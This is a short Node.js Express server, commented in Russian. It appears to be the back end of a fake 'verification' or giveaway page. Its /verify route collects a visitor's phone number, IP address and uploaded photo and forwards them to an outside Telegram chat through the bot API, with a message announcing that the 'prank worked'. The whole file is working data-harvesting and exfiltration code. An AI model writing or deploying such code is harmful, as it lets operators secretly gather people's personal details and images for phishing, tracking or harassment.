const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');

const app = express();
const upload = multer();

// Токены будут браться из настроек облака (Render)
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(express.static('public'));
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/verify', upload.single('photo'), async (req, res) => {
    try {
        const { phone, ip } = req.body;
        const photo = req.file;

        // 1. Сообщение с данными
        const message = `🎯 Розыгрыш сработал!\n📱 Тел: ${phone}\n🌐 IP: ${ip}`;
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });

        // 2. Отправка фото
        if (photo) {
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('photo', photo.buffer, { filename: 'photo.jpg' });

            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
                headers: form.getHeaders()
            });
        }
        res.sendStatus(200);
    } catch (error) {
        console.error(error);
        res.sendStatus(500);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Сервер на порту ${PORT}`));